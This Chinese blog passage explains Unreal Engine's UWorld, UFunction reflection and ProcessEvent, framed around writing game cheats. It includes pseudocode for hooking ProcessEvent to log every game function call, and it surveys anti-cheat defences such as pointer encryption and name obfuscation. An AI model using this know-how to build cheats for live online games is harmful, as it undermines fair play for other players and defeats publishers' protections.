游戏、影视、仿真、虚拟制作</td></tr><tr><td><strong>代表作品</strong></td><td>《原神》《饥荒》《空洞骑士》</td><td>《堡垒之夜》《PUBG》《黑神话：悟空》《古墓丽影》</td></tr><tr><td><strong>资源生态</strong></td><td>Unity Asset Store</td><td>Unreal Marketplace</td></tr><tr><td><strong>平台适配</strong></td><td>非常广（移动端、WebGL）</td><td>偏向高性能设备（PC、主机）</td></tr></tbody></table><h3 id="Uworld"><a href="#Uworld" class="headerlink" title="Uworld"></a>Uworld</h3><p>管理关卡(Levels):1个 Uworld 包含多个ULevel，包括持久化关卡(PersistentLevel)和子关卡(Sub-Levels)。</p><p>管理所有的 Actor:AActor 是 游戏中的所有动态和静态对象 的基础:玩家、NPC、静态物体等等。拿到AActors列表也就拿到了当前游戏内的所有实体。其中AActor子类APawn是可由玩家或 AI控制的对象，通常就是需要拿到的玩家。</p><p>如下图，对于外挂而言，可以从UWord可以拿到所需要的几乎一切数据。</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251005173729067.png" alt="image-20251005173729067"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">UWorld</span><br><span class="line"> ├── PersistentLevel              ← 当前持久关卡</span><br><span class="line"> │    ├── AActor (角色、物体)</span><br><span class="line"> │    │    └── UComponent（组件，如Mesh, Collider, etc.）</span><br><span class="line"> │    ├── PlayerController / Pawn / Camera</span><br><span class="line"> │    └── Light, Sky, Landscape...</span><br><span class="line"> ├── StreamingLevels[]            ← 流式加载的子关卡</span><br><span class="line"> ├── GameState / GameMode</span><br><span class="line"> ├── NavigationSystem             ← AI导航网格</span><br><span class="line"> ├── PhysicsScene / Scene         ← 物理世界</span><br><span class="line"> └── LevelScriptActor             ← 关卡逻辑脚本</span><br></pre></td></tr></table></figure><p>引擎大致会经历以下过程：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">UWorld* World = NewObject&lt;UWorld&gt;();</span><br><span class="line">World-&gt;InitializeNewWorld();</span><br><span class="line">World-&gt;LoadPersistentLevel(MapName);</span><br><span class="line">World-&gt;BeginPlay();</span><br></pre></td></tr></table></figure><p><strong>蓝图（Blueprint）是 Unreal Engine 的可视化脚本系统（Visual Scripting System）。</strong>它允许你不用写 C++ 代码，就能用 <strong>拖拽节点</strong> 的方式来编写逻辑、控制游戏行为、操作对象。</p><p>可以把它理解为： 用图形化方式表示代码逻辑的脚本语言。</p><h3 id="UFunction"><a href="#UFunction" class="headerlink" title="UFunction"></a>UFunction</h3><p><code>UFunction</code> 是 Unreal 引擎中用来描述 C++ 函数元信息（metadata）的类。</p><p>它不是一个“函数本身”， 而是一个<strong>用于记录函数信息的对象</strong>——例如函数名、参数类型、返回值、访问标志、蓝图可见性、所属类等等。</p><p>它继承自 UE 的反射基类 <code>UField</code> → <code>UStruct</code> → <code>UFunction</code>。</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title">UFunction</span> : <span class="title">public</span> <span class="title">UStruct</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    uint32 FunctionFlags;       <span class="comment">// 函数修饰符</span></span><br><span class="line">    uint8  NumParms;            <span class="comment">// 参数数量</span></span><br><span class="line">    uint16 ParmsSize;           <span class="comment">// 参数总字节数</span></span><br><span class="line">    uint16 ReturnValueOffset;   <span class="comment">// 返回值偏移</span></span><br><span class="line">    EFunctionFlags Flags;       <span class="comment">// 执行标志（Native, BlueprintCallable 等）</span></span><br><span class="line">    ...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>UE 的反射系统由三大支柱组成：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">UClass     → 描述类</span><br><span class="line">UProperty  → 描述类中的变量</span><br><span class="line">UFunction  → 描述类中的函数</span><br></pre></td></tr></table></figure><p>因此，<code>UFunction</code> 的作用可以概括为三点：</p><table><thead><tr><th>功能</th><th>说明</th></tr></thead><tbody><tr><td><strong>反射调用</strong></td><td>允许在运行时通过函数名调用函数，而不依赖编译时符号。</td></tr><tr><td><strong>蓝图绑定</strong></td><td>让蓝图能够调用或实现 C++ 函数。</td></tr><tr><td><strong>网络与事件支持</strong></td><td>用于标记函数为 RPC（客户端 &#x2F; 服务器调用）。</td></tr></tbody></table><p>假设写了一个 C++ 类：</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">UCLASS()</span><br><span class="line"><span class="keyword">class</span> <span class="title">AMyCharacter</span> : <span class="title">public</span> <span class="title">ACharacter</span></span><br><span class="line">&#123;</span><br><span class="line">    GENERATED_BODY()</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    UFUNCTION(BlueprintCallable, Category=<span class="string">&quot;Player&quot;</span>)</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">JumpHigher</span>(<span class="params"><span class="built_in">float</span> Power</span>)</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在编译时，UE 的反射系统（通过 UnrealHeaderTool）会自动为这个类生成元信息：</p><ul><li>创建一个 <code>UFunction</code> 对象描述 <code>JumpHigher</code>；</li><li>记录函数名、参数类型、返回值类型；</li><li>注册到 <code>AMyCharacter</code> 的 <code>UClass</code> 里。</li></ul><p>于是：</p><p>蓝图就能在节点里看到 “JumpHigher”；编辑器能知道它有一个 <code>float Power</code> 参数； 引擎运行时可以用字符串名调用它（反射）。</p><p> <strong>编译阶段</strong></p><ul><li>UnrealHeaderTool 解析 <code>.h</code> 文件中 <code>UFUNCTION()</code> 宏；</li><li>为函数生成注册代码；</li><li>在运行时创建对应的 <code>UFunction</code> 对象并挂在所属 <code>UClass</code> 上。</li></ul><p> <strong>运行时阶段</strong></p><ul><li>引擎通过 <code>UObject::FindFunction(FName(&quot;JumpHigher&quot;))</code> 找到对应的 <code>UFunction</code>；</li><li>然后调用 <code>UObject::ProcessEvent(UFunction* Function, void* Params)</code> 执行；</li><li>反射系统自动处理参数传递、返回值、事件广播等。</li></ul><p>UFunction 的底层结构（内部成员）</p><p>在引擎源码中（<code>UObject/Class.h</code>），<code>UFunction</code> 继承自 <code>UStruct</code>，它保存了函数的完整签名信息：</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> UFunction : <span class="keyword">public</span> UStruct</span><br><span class="line">&#123;</span><br><span class="line">    EFunctionFlags FunctionFlags;   <span class="comment">// 标志（是否可蓝图、是否原生、是否RPC）</span></span><br><span class="line">    uint8 NumParms;                 <span class="comment">// 参数数量</span></span><br><span class="line">    uint16 ParmsSize;               <span class="comment">// 参数区大小</span></span><br><span class="line">    uint16 ReturnValueOffset;       <span class="comment">// 返回值偏移</span></span><br><span class="line">    uint8 RepOffset;                <span class="comment">// 网络同步偏移</span></span><br><span class="line">    FNativeFuncPtr Func;            <span class="comment">// 指向原生C++函数的指针</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>特别重要的是这一行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FNativeFuncPtr Func;</span><br></pre></td></tr></table></figure><p>它指向真正的 C++ 函数实现。反射系统在 <code>ProcessEvent</code> 时会用这个指针去调用底层实现。</p><p>在 C++ 层可以直接使用 <code>UFunction</code> 来调用函数：</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">UObject* Obj = GetSomeUObject();</span><br><span class="line">UFunction* Func = Obj-&gt;FindFunction(TEXT(<span class="string">&quot;JumpHigher&quot;</span>));</span><br><span class="line"><span class="keyword">if</span> (Func)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">struct</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">float</span> Power;</span><br><span class="line">    &#125; Params;</span><br><span class="line">    Params.Power = <span class="number">100.0f</span>;</span><br><span class="line">    Obj-&gt;ProcessEvent(Func, &amp;Params);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这就实现了“用字符串名调用函数”的效果（类似于 C# 的反射调用）</p><h3 id="ProcessEvent"><a href="#ProcessEvent" class="headerlink" title="ProcessEvent"></a>ProcessEvent</h3><p>在源码中（<code>UObject/ScriptCore.cpp</code>）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">virtual void ProcessEvent(UFunction* Function, void* Parameters);</span><br></pre></td></tr></table></figure><p>给定一个函数描述（<code>UFunction</code>）和参数数据， <code>ProcessEvent</code> 就会执行这个函数，无论它是 C++ 实现、蓝图实现，还是网络 RPC。</p><blockquote><p> <code>ProcessEvent</code> &#x3D; “执行一个函数（UFunction）+ 自动处理参数传递 + 调度蓝图或原生逻辑”。</p></blockquote><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> UObject::ProcessEvent(UFunction* Function, <span class="keyword">void</span>* Parameters)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 处理网络RPC（Server/Client）</span></span><br><span class="line">    <span class="keyword">if</span> (Function-&gt;FunctionFlags &amp; FUNC_Net)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 可能是远程调用，走网络同步流程</span></span><br><span class="line">        CallRemoteFunction(Function, Parameters);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用C++原生函数（如果有实现）</span></span><br><span class="line">    <span class="keyword">if</span> (Function-&gt;Func)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 调用真实C++函数指针</span></span><br><span class="line">        Function-&gt;Func(<span class="keyword">this</span>, Parameters);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 蓝图函数（无原生实现） → 由脚本VM执行</span></span><br><span class="line">        CallScriptFunction(Function, Parameters);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>假设写了一个函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">UFUNCTION(BlueprintCallable)</span><br><span class="line">void JumpHigher(float Power);</span><br></pre></td></tr></table></figure><p>当蓝图中调用它时，流程如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">蓝图节点点击 → 蓝图虚拟机 → ProcessEvent()</span><br><span class="line">    ↓</span><br><span class="line">找到 JumpHigher 对应的 UFunction</span><br><span class="line">    ↓</span><br><span class="line">准备参数区 (float Power)</span><br><span class="line">    ↓</span><br><span class="line">ProcessEvent(JumpHigher, &amp;Params)</span><br><span class="line">    ↓</span><br><span class="line">调用 UFunction::Func (指向 C++ 实现)</span><br></pre></td></tr></table></figure><p><strong>换句话说：</strong></p><blockquote><p>蓝图、反射、RPC，全都用同一个执行路径：<code>UObject::ProcessEvent</code>。</p></blockquote><p>也可以在 C++ 中手动使用 <code>ProcessEvent</code> 调用任意函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">UObject* Obj = GetSomeActor();</span><br><span class="line">UFunction* Func = Obj-&gt;FindFunction(TEXT(&quot;JumpHigher&quot;));</span><br><span class="line">if (Func)</span><br><span class="line">&#123;</span><br><span class="line">    struct</span><br><span class="line">    &#123;</span><br><span class="line">        float Power;</span><br><span class="line">    &#125; Params;</span><br><span class="line"></span><br><span class="line">    Params.Power = 500.f;</span><br><span class="line"></span><br><span class="line">    Obj-&gt;ProcessEvent(Func, &amp;Params);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这就相当于运行时通过反射调用了 <code>JumpHigher()</code>。</p><p>类似 C# 的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">obj.GetType().GetMethod(&quot;JumpHigher&quot;).Invoke(obj, new object[]&#123;500&#125;);</span><br></pre></td></tr></table></figure><p>在 IL2CPP 或 UE Native 分析时：</p><ul><li><code>ProcessEvent</code> 是最常被 Hook 的函数之一；</li><li>它几乎会被调用成千上万次；</li><li>Hook 它可以打印出所有正在执行的蓝图&#x2F;C++ 函数名称与参数；</li><li>在作弊、调试、自动化脚本中非常常用。</li></ul><p>例如（伪代码）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">void (*original_ProcessEvent)(UObject*, UFunction*, void*);</span><br><span class="line"></span><br><span class="line">void hooked_ProcessEvent(UObject* Obj, UFunction* Func, void* Params)</span><br><span class="line">&#123;</span><br><span class="line">    printf(&quot;[CALL] %s::%s\n&quot;, *Obj-&gt;GetName(), *Func-&gt;GetName());</span><br><span class="line">    original_ProcessEvent(Obj, Func, Params);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这能让你实时看到游戏中执行的每个函数调用，非常有价值。</p><blockquote><p>为什么要通过ProcessEvent的方式去调用比如Obj-&gt;ProcessEvent(Func, &amp;Params);，不能直接new个对象然后对象.方法调用吗，这么做的意义在哪?</p></blockquote><p>假设我们在纯 C++ 世界里：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AMyCharacter* Obj = new AMyCharacter();</span><br><span class="line">Obj-&gt;JumpHigher(100.f);</span><br></pre></td></tr></table></figure><p>这当然没问题，也最直接。编译器知道 <code>AMyCharacter</code> 类里有 <code>JumpHigher()</code> 方法，它能直接生成汇编调用代码，性能最高。</p><p>那为什么 UE 要绕一圈用 <code>ProcessEvent()</code> 呢？</p><blockquote><p>因为 Unreal Engine 是一个“<strong>反射式运行时系统</strong>”，而不是普通的静态 C++ 程序。</p></blockquote><p>UE 的目标不仅是跑一段逻辑，而是要：</p><ul><li>让编辑器（Blueprint、Sequencer、AI、UI 等）<strong>动态识别和调用函数</strong>；</li><li>让引擎<strong>支持脚本层调用 C++ 层逻辑</strong>；</li><li>让游戏<strong>支持事件广播、网络RPC、热重载</strong>；</li><li>让<strong>蓝图 &#x2F; 网络 &#x2F; 编辑器</strong> 在<strong>不知道类型的情况下也能调用函数</strong>。</li></ul><p>而普通的 <code>Obj-&gt;JumpHigher()</code> 是<strong>编译期绑定（compile-time binding）</strong>，在运行时是<strong>无法通过字符串或元信息去找到它的</strong>。</p><table><thead><tr><th>模式</th><th>调用方式</th><th>特点</th></tr></thead><tbody><tr><td><strong>静态绑定（C++ 调用）</strong></td><td><code>Obj-&gt;JumpHigher(100)</code></td><td>编译时确定函数地址；快但死板</td></tr><tr><td><strong>动态绑定（反射调用）</strong></td><td><code>Obj-&gt;ProcessEvent(Func, &amp;Params)</code></td><td>运行时查找函数并调用；灵活但慢</td></tr></tbody></table><p>UE 设计的是一个<strong>可反射、可扩展的运行时系统</strong>，它必须能在<strong>不知道类型的情况下执行任意函数</strong>。</p><p>想象你做一个蓝图节点：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[Call Function by Name]</span><br></pre></td></tr></table></figure><p>用户在蓝图里输入字符串：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;JumpHigher&quot;</span><br></pre></td></tr></table></figure><p>然后节点要去调用这个函数。</p><p>此时你只能这么写：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">UFunction* Func = Obj-&gt;FindFunction(TEXT(&quot;JumpHigher&quot;));</span><br><span class="line">if (Func)</span><br><span class="line">&#123;</span><br><span class="line">    struct &#123; float Power; &#125; Params = &#123; 100.0f &#125;;</span><br><span class="line">    Obj-&gt;ProcessEvent(Func, &amp;Params);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为编译时你根本不知道会调用哪个函数，只能通过运行时的 <strong>字符串 → UFunction → ProcessEvent</strong> 动态调用。</p><p>virtual void ProcessEvent(UFunction* Function, void* Parameters);</p><p>有两个参数：</p><table><thead><tr><th>参数名</th><th>类型</th><th>含义</th></tr></thead><tbody><tr><td><strong>Function</strong></td><td><code>UFunction*</code></td><td>描述要调用的函数的元信息对象</td></tr><tr><td><strong>Parameters</strong></td><td><code>void*</code></td><td>指向参数数据结构的指针（通常是一个栈结构或用户定义的 struct）</td></tr></tbody></table><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251006221156275.png" alt="image-20251006221156275"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">UObject::ProcessEvent(UFunction* Func, void* Params)</span><br><span class="line">   └─(检查RPC/调试钩子等)→ 若为原生(Native)</span><br><span class="line">       └─ UFunction::Invoke(...) / CallFunction(...)</span><br><span class="line">            └─ (*FuncPtr)(Obj, Stack, RESULT_PARAM)      ← 这里的 FuncPtr 是函数指针</span><br><span class="line">                 └─ *.gen.cpp 里由 UHT 生成的 Thunk(桩函数)</span><br><span class="line">                      └─ 真正的 C++ 实现(你写的函数 / _Implementation)</span><br></pre></td></tr></table></figure><ol><li>ProcessEvent：统一入口</li></ol><ul><li><code>UObject::ProcessEvent(UFunction* Function, void* Params)</code> 是统一调度口：做网络 RPC 判断、蓝图&#x2F;原生分流、调试钩子等。</li><li>判断是“原生函数”就走 <strong>Native 路径</strong>，否则走蓝图 VM。</li></ul><ol start="2"><li>UFunction::Invoke &#x2F; CallFunction</li></ol><ul><li>不同版本命名略有差异，本质是<strong>根据 <code>UFunction</code> 的元信息调用其绑定的原生函数指针</strong>。</li><li>这里会把 <code>void* Params</code>&#x2F;<code>FFrame Stack</code> 这样的参数区准备好，随后调用函数指针。</li></ul><ol start="3"><li><code>(*Func)(Obj, Stack, RESULT_PARAM)</code></li></ol><ul><li><p><code>Func</code> 是 <code>UFunction</code> 里保存的 <strong>原生函数指针</strong>（类型一般是 <code>FNativeFuncPtr</code>）。</p></li><li><p>调用签名常见为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">using FNativeFuncPtr = void(*)(UObject* Context, FFrame&amp; Stack, RESULT_DECL);</span><br></pre></td></tr></table></figure><ul><li><code>Obj/Context</code>：调用对象</li><li><code>Stack</code>：参数解析用的执行栈（从里面按元信息取出各参数）</li><li><code>RESULT_PARAM</code>&#x2F;<code>RESULT_DECL</code>：返回值写回位置</li></ul></li></ul><ol start="4"><li>*.gen.cpp 的 Thunk（桩函数）</li></ol><ul><li>这个函数指针 <strong>不是直接指向你写的 C++ 方法</strong>，而是指向 <strong>UHT 生成的“Thunk”</strong>（桩函数），文件名形如 <code>YourClass.gen.cpp</code>。</li><li>Thunk 的职责：<ul><li>用宏从 <code>FFrame</code> 里<strong>解码参数</strong>（<code>P_GET_PROPERTY</code> &#x2F; <code>P_GET_OBJECT</code> 等）</li><li><code>P_FINISH;</code> 检查参数读取完毕</li><li>调用<strong>真正实现</strong>：<ul><li>普通 <code>UFUNCTION</code>：<code>P_THIS-&gt;YourFunc(DecodedParams...)</code></li><li><code>BlueprintNativeEvent</code>：调用 <code>YourFunc_Implementation(...)</code></li></ul></li><li>如果有返回值，写入 <code>RESULT_PARAM</code></li></ul></li></ul><p>典型生成代码（示意）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// 定义由 UHT 生成的原生桩</span><br><span class="line">DEFINE_FUNCTION(AMyCharacter::execJumpHigher)</span><br><span class="line">&#123;</span><br><span class="line">    P_GET_PROPERTY(FFloatProperty, Z_Param_Power);</span><br><span class="line">    P_FINISH;</span><br><span class="line">    P_THIS-&gt;JumpHigher(Z_Param_Power);       // 调到你写的 C++ 实现</span><br><span class="line">    // 如有返回值：*(ReturnType*)RESULT_PARAM = Ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="5"><li>“真正的 C++ 函数”</li></ol><ul><li><p>就是你在类里写的那个实现：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">UFUNCTION(BlueprintCallable)</span><br><span class="line">void JumpHigher(float Power) &#123; /* 你的逻辑 */ &#125;</span><br></pre></td></tr></table></figure></li><li><p>若是 <code>BlueprintNativeEvent</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">UFUNCTION(BlueprintNativeEvent)</span><br><span class="line">void DoX(int A);</span><br><span class="line">void DoX_Implementation(int A) &#123; /* 真正实现 */ &#125;</span><br><span class="line">// Thunk 会调用 _Implementation</span><br></pre></td></tr></table></figure></li></ul><ol start="6"><li>为什么需要 Thunk？</li></ol><ul><li><strong>编组&#x2F;解组（marshalling）</strong>：把反射&#x2F;蓝图世界里的“无类型参数块(FFrame)”转换成强类型的 C++ 形参。</li><li><strong>统一通道</strong>：同一套机制兼容蓝图、RPC、编辑器调用、反射调用。</li><li><strong>元信息驱动</strong>：根据 <code>UFunction</code> 的 <code>Property</code> 链表解参数&#x2F;写返回值。</li><li><strong>隔离生成代码</strong>：参数处理、错误检查、默认值、标志处理都放在自动生成的桩里，你的业务函数保持干净。</li></ul><blockquote><p>LineTraceSingleLineOfSightToStaticFindObject(光线类的效果，判断是否遮挡)<br>K2 DrawText，K2 DrawLine(引擎绘制)</p></blockquote><h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><p>UE开发中，对引擎做改动是比较困难的，目前的游戏厂商常用的有以下的方式:</p><p><strong>指针加密</strong></p><blockquote><p>在运行时不直接存放真实指针，而是存放加密后的值；每次使用前先解密，用完再丢弃或重新加密。</p></blockquote><p>假设原本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UWorld* GWorld;</span><br></pre></td></tr></table></figure><p>被修改为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">uintptr_t GWorld_Encrypted;</span><br><span class="line"></span><br><span class="line">UWorld* GetGWorld()</span><br><span class="line">&#123;</span><br><span class="line">    return reinterpret_cast&lt;UWorld*&gt;(GWorld_Encrypted ^ 0x5A5A5A5A5A5A5A5A);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在引擎访问全局对象时，都通过一个 <strong>解密函数</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">auto World = GetGWorld();</span><br><span class="line">World-&gt;Tick(...);</span><br></pre></td></tr></table></figure><p><strong>修改引擎关键结构体</strong></p><p>官方 UE4（简化）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">struct FUObjectItem &#123;</span><br><span class="line">    UObject* Object;</span><br><span class="line">    int32 Flags;</span><br><span class="line">    int32 ClusterRootIndex;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>被厂商修改为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">struct FUObjectItem_Protected &#123;</span><br><span class="line">    uint64 EncodedPtr;   // Object指针被编码</span><br><span class="line">    uint32 Flags;</span><br><span class="line">    uint32 Magic;        // 新增无用字段</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>或直接改偏移：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 原始偏移 0x10 改为 0x18</span><br><span class="line">UObject* Object = *(UObject**)((uintptr_t)item + 0x18);</span><br></pre></td></tr></table></figure><p>调换变量的顺序也行</p><p>所有现成的 SDK &#x2F; Dumper 工具失效；</p><p><strong>混淆函数名</strong></p><p>UE 的反射系统和蓝图系统依赖字符串（如 <code>UFunction</code>、<code>UClass</code> 名）。</p><p>在 <code>global-metadata.dat</code> 或 <code>GNames</code> 中可以看到很多原始函数名，例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Function /Script/Game.Character.Jump</span><br><span class="line">Function /Script/Game.Player.FireWeapon</span><br></pre></td></tr></table></figure><p>这些字符串在反编译或 SDK Dump 时非常显眼。混淆函数名的思路是：</p><blockquote><p>在打包或编译阶段对所有函数、类、属性名进行哈希或替换，保证引擎运行时可识别，但肉眼无法理解。</p></blockquote><p>编译前：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">UFUNCTION(BlueprintCallable)</span><br><span class="line">void FireWeapon();</span><br></pre></td></tr></table></figure><p>混淆处理后（自动脚本）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">UFUNCTION(BlueprintCallable)</span><br><span class="line">void a5F4E1C8();</span><br></pre></td></tr></table></figure><p>或者动态加密：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RegisterFunction(DecryptString(&quot;0xA93F1221B&quot;));</span><br></pre></td></tr></table></figure><p>最终在反射表中看到的函数名就变成：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Function /Script/Game.a5F4E1C8</span><br></pre></td></tr></table></figure><p>更多可以看</p><p><a href="https://www.xianlongok.site/post/6605f9f/#UFUCTION">UE4 反射系统 | 十三</a></p><p><a href="https://bbs.kanxue.com/thread-282857.htm">[原创]UE4.27SDK-Dump-软件逆向-看雪论坛-安全社区|非营利性质技术交流社区</a></p><p><a href="https://www.52pojie.cn/thread-1456734-1-1.html">记录一次虚幻4(UE4)手游逆向 - 吾爱破解 - 52pojie.cn</a></p><p><a href="https://www.52pojie.cn/thread-1838396-1-1.html">逆向UE4最简单的一集 - 吾爱破解 - 52pojie.cn</a></p><p>这些博客</p><h2 id="外挂原理"><a 